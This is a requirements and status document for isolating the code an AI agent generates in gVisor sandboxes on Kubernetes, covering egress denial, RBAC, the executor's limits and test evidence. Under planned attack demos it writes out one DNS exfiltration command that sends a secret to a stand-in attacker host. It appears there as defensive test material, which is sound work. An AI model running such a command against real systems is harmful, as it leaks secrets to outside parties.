# P1 - Sandboxed code execution

**Goal:** code the agent generates runs in a disposable, strongly isolated sandbox that holds nothing worth stealing and can reach nothing worth attacking. Covers goal G1 in [../01-overview.md](../01-overview.md).

Implementation and findings: [projects/01-sandboxed-code-exec/](../../../projects/01-sandboxed-code-exec/README.md).

## User stories

- As an **agent**, I can get a clean sandbox quickly, run code in it, get back stdout/stderr/exit code, and give it back.
- As an **operator**, I can be sure that code in the sandbox can't read the agent's credentials, call the API server, reach the internet, or exhaust the node.
- As a **security reviewer**, I can run one command per control and see PASS/FAIL, including a negative control.

## Requirements

### Isolation

| ID | Requirement | Priority | Status |
| --- | --- | --- | --- |
| P1-01 | Sandbox pods run under gVisor (`runtimeClassName: gvisor`). | Must | **Done**: `make verify` |
| P1-02 | Sandbox pods run non-root, with a read-only root filesystem, all capabilities dropped, no privilege escalation, seccomp `RuntimeDefault`. Writable scratch is a size-limited `emptyDir` at `/tmp`. | Must | **Done**: `make verify` (uid, read-only root); `make test-executor` (no writes outside `/tmp`) |
| P1-03 | No service-account token is mounted in the sandbox. | Must | **Done**: `make verify` |
| P1-04 | The `sandboxes` namespace enforces Pod Security `restricted`. | Must | **Partial**: namespace label set; enforcement not tested |
| P1-05 | CPU, memory and ephemeral-storage limits per sandbox; a pids limit per pod. | Must | **Partial**: configured; fork-bomb test in M4 |
| P1-06 | Sandbox egress is denied by default: no internet, no API server, no cluster DNS. | Must | **Done**: `make verify` with negative control |
| P1-07 | Only the agent (`app=agent` in namespace `agent`) can reach the sandbox, and only on the executor port. | Must | **Done**: `make test-executor`, `make test-agent` |
| P1-08 | No policy is added behind our back: the sandbox template sets `networkPolicyManagement: Unmanaged`. | Must | **Done**: `make verify` egress check would fail otherwise |
| P1-09 | ICMP from the sandbox is blocked. | Must | Planned (M4) |
| P1-10 | Where a task needs egress, only allowlisted DNS names can be resolved and reached (Cilium `toFQDNs`). | Should | Planned (M6); WSL2 kernel support unconfirmed |
| P1-11 | Kata Containers runtime available as a stronger alternative, benchmarked on bare metal. | Could | Planned (M7) |

### Lifecycle

| ID | Requirement | Priority | Status |
| --- | --- | --- | --- |
| P1-20 | Sandboxes are claimed from a warm pool (`SandboxWarmPool`) and destroyed on release; no state carries between tasks. | Must | **Done**: `make test-agent` (claim, release, no leftover claim) |
| P1-21 | A claim carries a `shutdownTime` backstop so a dead agent can't leak sandboxes. | Should | **Partial**: set by the agent; expiry not tested |
| P1-22 | Readiness is reported without the node needing network access to the sandbox (`exec` probe). | Must | **Done**: warm pool reaches ready in all tests |
| P1-23 | Cap on warm-pool size and concurrent sandboxes (ResourceQuota). | Should | Planned |

### Executor

| ID | Requirement | Priority | Status |
| --- | --- | --- | --- |
| P1-30 | `POST /run {code, timeout_s}` returns `{stdout, stderr, exit_code, timed_out, duration_ms, truncated}`; `GET /healthz`. | Must | **Done**: `make executor-test`, `make test-executor` |
| P1-31 | Wall-clock timeout kills the whole process group, so background children can't outlive the run. Timeout capped at 60s, with an `RLIMIT_CPU` backstop. | Must | **Done**: `make executor-test` |
| P1-32 | Output capped at 64 KiB per stream; request body capped at 256 KiB; one run at a time (409 when busy). | Must | **Done**: `make executor-test` |
| P1-33 | The executor is documented as not a security boundary. | Must | **Done**: P1 README |

### Agent side

| ID | Requirement | Priority | Status |
| --- | --- | --- | --- |
| P1-40 | The agent runs in its own namespace and pod, never in the sandbox. | Must | **Done**: `make test-agent` |
| P1-41 | Agent RBAC: `create/get/delete` on `sandboxclaims` and `get` on `sandboxes` in `sandboxes` only. No direct `Sandbox` creation, no claim update or list, no pods, exec or secrets. | Must | **Done**: `make test-agent` |
| P1-42 | Admission policy: the agent's claims must name an approved warm pool and may not add pod labels/annotations, env or volumes. Denials come from the policy, not schema validation. | Must | **Done**: `make test-agent` |
| P1-43 | Agent egress: only the API server and sandbox port 8888. No internet, no DNS, no other sandbox ports. | Must | **Done**: `make test-agent` |
| P1-44 | The agent always releases its claim, including on error. | Must | **Partial**: release on success tested; error path not tested |

### Evidence

| ID | Requirement | Priority | Status |
| --- | --- | --- | --- |
| P1-50 | Attack demos: fork bomb, egress exfiltration, DNS exfiltration (`dig $(cat secret).attacker.example`), ICMP. Each names the layer that stopped it. | Must | Planned (M4) |
| P1-51 | Benchmarks: cold `Sandbox` vs warm-pool claim latency; runc vs gVisor overhead for CPU, syscall-heavy and I/O workloads. Each states the runtime and environment used. | Must | Planned (M5); first data point: warm claim ≈ 300 ms |
| P1-52 | A clean rebuild (`make down up p1`) passes all P1 suites. | Must | **Done**: last run 7 + 8 + 25 checks |

## Acceptance

P1 is done when every **Must** above is *Done*, the attack demos and benchmarks are in `results/`, and the findings log is up to date.
